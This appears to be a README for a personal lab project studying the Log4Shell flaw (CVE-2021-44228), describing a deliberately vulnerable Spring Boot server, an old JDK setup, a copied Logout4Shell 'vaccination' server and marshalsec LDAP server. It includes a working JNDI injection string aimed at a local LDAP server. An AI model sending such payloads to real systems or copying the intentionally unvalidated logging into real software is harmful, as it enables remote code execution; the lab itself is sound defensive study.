# oregon

Project to look at [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

## Structure

Naming convention for our stuff will be Oregon cities, we'll keep the names of copied code from cybereason and mbechler.

* oregon Our parent project.
* [ashland](ashland/README.md) Our vulnerable server.
* [logout4shell](logout4shell/README.md) Copied [Logout4Shell](https://github.com/Cybereason/Logout4Shell) vaccination server.
* [marshalsec](marshalsec/README.md) Copied marshalsec ldap server.



## Immunize



    ${jndi:ldap://localhost:1389/a}



## Narrative


Log4j bug.  I suppose the first thing to do, to understand what is going on, is to set up a vulnerable server.

We'll call it ashland, and it will be a spring boot Java server with a vulnerable Log4J version.

We'll make it easy to exploit, by not validating fields, and logging whatever is entered.

Now that we have a vulnerable server, let's set up the vaccination servers.

We'll need a [pre-8.121 JDK](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html), say
8.112, found [here](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).

Still not able to [exploit](https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot).

We'll need to [update](https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.logging.log4j) the default logging in Spring.

.... and that did the trick:


      .   ____          _            __ _ _
     /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
    ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
     \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
      '  |____| .__|_| |_|_| |_\__, | / / / /
     =========|_|==============|___/=/_/_/_/
     :: Spring Boot ::                (v2.6.0)
    
    2021-12-12 09:30:37.577  INFO 18077 --- [           main] c.p.a.App                                : Starting App using Java 1.8.0_112 on pan000 with PID 18077 (/home/karl/w/oregon/ashland/target/classes     started by karl in /home/karl/w/oregon/ashland)
    2021-12-12 09:30:37.583  INFO 18077 --- [           main] c.p.a.App                                : No active profile set, falling back to default profiles: default
    2021-12-12 09:30:38.348  INFO 18077 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
    2021-12-12 09:30:38.362  INFO 18077 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
    2021-12-12 09:30:38.362  INFO 18077 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.55]
    2021-12-12 09:30:38.406  INFO 18077 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
    2021-12-12 09:30:38.406  INFO 18077 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 795 ms
    2021-12-12 09:30:38.728  INFO 18077 --- [           main] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
    2021-12-12 09:30:38.862  INFO 18077 --- [           main] o.s.b.a.e.w.EndpointLinksResolver        : Exposing 1 endpoint(s) beneath base path '/actuator'
    2021-12-12 09:30:38.892  INFO 18077 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
    2021-12-12 09:30:38.906  INFO 18077 --- [           main] c.p.a.App                                : Started App in 1.619 seconds (JVM running for 2.076)
    2021-12-12 09:30:50.077  INFO 18077 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
    2021-12-12 09:30:50.077  INFO 18077 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
    2021-12-12 09:30:50.078  INFO 18077 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
    Setting FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS value to True, current value is false


Breakpoint at org.apache.logging.log4j.core.lookup.Interpolator.lookup seems to be where the offending substitution occurs, while performing the MessagePatternConverter.

Setting the JDK 8.121 or better causes the JVM to do some verification, and returns "foo" instead of executing the specified code.



